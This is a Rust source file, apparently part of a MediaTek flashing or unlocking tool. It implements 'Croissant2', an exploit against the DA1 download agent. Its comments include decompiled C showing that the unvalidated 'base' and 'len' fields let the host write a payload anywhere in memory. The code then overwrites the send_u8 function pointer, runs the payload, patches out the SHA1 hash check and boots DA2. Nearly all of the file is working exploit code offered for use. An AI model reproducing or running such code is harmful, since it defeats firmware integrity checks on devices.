use da_patcher::{
    Disassembler,
    slice::fuzzy::{fuzzy_search_thumb2, generic_reg_matcher},
};
use simpleport::{SimpleRead, SimpleWrite};

use crate::{
    Result,
    exploit::{Exploit, boot_da2, cmp, croissant_find_ptr, find},
};
use derive_ctor::ctor;

/// DA1 function pointer overwrite
///
/// ### How it works?
/// DA1 (as well as DA2) can do both USB and UART backends to communicate with host, that's why we have function pointers
///
/// The boot function looks like this (with functions and variables renamed for readability):
/// ```c
/// int boot()
/// {
///   int (*base)(void); // r5
///   int len; // r9
///   int chunk_size; // r6
///   unsigned int n; // r4
///   __int64 chunk_n; // kr00_8
///   char *addr; // r0
///   unsigned int i; // r0
///   unsigned int j; // r4
///   _BYTE sha1_struct[56]; // [sp+0h] [bp-38h] BYREF
///
///   base = (int (*)(void))MEMORY[0x2017AFC]();
///   len = MEMORY[0x2017AFC]();
///   chunk_size = MEMORY[0x2017AFC]();
///   MEMORY[0x2017AE8](90);
///   printf("LoadDAToDRAM(), base=0x%x, length=0x%x\n", base, len);
///   n = 0;
///   chunk_n = div(len, chunk_size);
///   while ( 1 )
///   {
///     addr = (char *)base + n * chunk_size;
///     if ( n >= (unsigned int)chunk_n )
///       break;
///     MEMORY[0x2017AE4](addr, chunk_size);
///     MEMORY[0x2017AE8](90);
///     ++n;
///   }
///   MEMORY[0x2017AE4](addr, HIDWORD(chunk_n));
///   MEMORY[0x2017AE8](90);
///   sub_20155C0((int)sha1_struct, 0, 20);
///   sub_20103EE((int)base, len - 256, (int)sha1_struct);
///   for ( i = 0; i < 0x14; ++i )
///   {
///     if ( byte_2016478[i] != (unsigned __int8)sha1_struct[i] )
///     {
///       printf("Hash value mismatch! DA will Halt!\n");
///       for ( j = 0; j < 0x14; ++j )
///         printf("%x: %x %x\n", j, byte_2016478[j], (unsigned __int8)sha1_struct[j]);
///       while ( 1 )
///         ;
///     }
///   }
///   printf("LoadDAToDRAM(), verify pass and jump to DRAM\n\n=========================================\n");
///   return base();
/// }
/// ```
///
/// And the interesting part that the `base` and `len` are never validated, thus we can send payload anywhere.
///
/// The croissant2 overwrites send_u8 ptr (`MEMORY[0x2017AE8]`) to invoke the payload, then payload restores overwritten pointer, patches hash check and jumps back to this function.
///
/// ##### I probably could've made it smaller... but if it works, it worksâ„¢
#[derive(ctor)]
pub struct Croissant2<'a> {
    bytes: &'a [u8],
    payload: &'a [u8],
    da1_base: u32,
}

impl Exploit for Croissant2<'_> {
    fn run(&self, port: &mut simpleport::Port) -> Result<()> {
        let (base, offset) = croissant_find_ptr(
            "ldr r?, [r?, #?];\
             movs r?, #0x5a;\
             blx r?",
            self.bytes,
            2,
        )?;

        let payload_size = self.payload.len() as u32 + 16 as u32 + 4 + 4; // payload length + metadata + ptr which we won't overwrite + payload entry addr
        let to = base + offset + 4 // First, bump pointer to the end, so we can overwrite it
            - payload_size;

        let disasm = Disassembler::try_new()?;
        let backup_ptr = *fuzzy_search_thumb2(
            &disasm,
            self.bytes,
            "push.w ??;\
             movs r?, #0;\
             mov r?, r?;\
             mov r?, r?;\
             movs r?, #?;\
             mov r?, r?;\
             mov r?, r?;\
             bl #?;\
             ldr ??;\
             b #?",
            generic_reg_matcher,
        )?
        .start() as u32
            + self.da1_base;

        println!("Croissant: payload address: 0x{to:x}, backup ptr: 0x{backup_ptr:x}",);

        port.write_u32_be(to)?;
        port.write_u32_be(payload_size)?;
        // The remainder is exactly where we overwrite
        port.write_u32_be(payload_size - 4)?;
        port.read_u8()?; // Always ok

        // Jump address, the function to boot da2
        let boot_function = boot_da2(&disasm, self.bytes)? + self.da1_base;
        port.write_u32_le(boot_function | 1)?;

        // Original function which we'll restore
        let original_function = find(
            &disasm,
            self.bytes,
            "push ??; movs r?, #?; movs r?, #?; mov r?, r?; mov r?, r?; bl #?",
        )? + self.da1_base;
        port.write_u32_le(original_function | 1)?;

        // The pointer to restore (which we've overwritten)
        port.write_u32_le(base + offset)?;

        // `cmp` instruction address
        let patch_address = cmp(&disasm, self.bytes)? + self.da1_base;
        port.write_u32_le(patch_address)?;

        port.write_all(&self.payload)?;
        port.write_u32_le(backup_ptr | 1)?;

        port.read_u8()?; // Always ok

        // Payload entrypoint: upload addr + payload size - actual binary size
        // So basically start of the `self.payload`
        port.write_u32_le(to + payload_size - self.payload.len() as u32)?;

        Ok(())
    }
}
